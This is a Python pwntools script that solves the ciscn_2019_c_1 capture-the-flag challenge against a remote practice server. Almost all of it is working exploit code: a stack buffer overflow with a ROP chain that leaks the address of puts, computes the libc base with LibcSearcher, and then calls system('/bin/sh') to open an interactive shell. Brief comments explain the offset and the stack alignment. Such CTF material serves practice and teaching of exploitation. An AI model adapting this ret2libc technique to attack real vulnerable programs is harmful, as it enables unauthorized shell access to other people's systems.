from pwn import *
from LibcSearcher import *

# sh = process('./ciscn_2019_c_1')
sh = remote('node4.buuoj.cn', 27307)
elf = ELF('./ciscn_2019_c_1')

pop_rdi_ret = 0x400c83

# leak the libc base address
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.symbols['main']

sh.recvuntil(b'Input your choice!')
sh.sendline(b'1')
sh.recvuntil(b'encrypted')

# offset is 0x58(including the rbp)
payload1 = flat([cyclic(0x58), p64(pop_rdi_ret), p64(puts_got), p64(puts_plt), p64(main)])
# payload1 = modify(payload1)
sh.sendline(payload1)

sh.recvuntil(b'Ciphertext\n')
sh.recvuntil(b'\n')

# why here is recv(6)
# because the address of little-endian end with \x00 which **puts** don't put out
recv = u64(sh.recv(6).ljust(0x8, b'\x00'))
libc = LibcSearcher('puts', recv)
base = recv - libc.dump('puts')

system_addr = base + libc.dump('system')
binsh_addr = base + libc.dump('str_bin_sh')

sh.recvuntil(b'Input your choice!')
sh.sendline(b'1')
sh.recvuntil(b'encrypted\n')

# The environment is Ubuntu18, so you need to add a ret to align the stack
# system function call need address align to 0x10
ret = 0x4006b9
payload2 = flat([cyclic(0x58), p64(ret), p64(pop_rdi_ret), p64(binsh_addr), p64(system_addr)])
sh.sendline(payload2)
sh.recvuntil(b'Ciphertext\n')
sh.recvuntil(b'\n')

sh.interactive()
